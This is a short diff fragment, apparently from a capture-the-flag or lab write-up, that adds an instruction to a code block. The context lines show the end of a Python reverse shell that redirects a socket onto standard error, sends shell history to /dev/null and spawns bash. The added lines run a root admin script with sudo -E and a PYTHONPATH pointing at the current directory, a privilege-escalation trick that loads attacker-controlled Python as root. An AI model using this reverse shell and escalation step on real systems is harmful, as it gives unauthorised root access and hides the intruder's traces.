@@ -145,6 +145,10 @@ os.dup2(s.fileno(),2)
 os.putenv("HISTFILE",'/dev/null')
 pty.spawn("/bin/bash")
 s.close()
+
+and run script with 
+
+sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
 ```
 
 
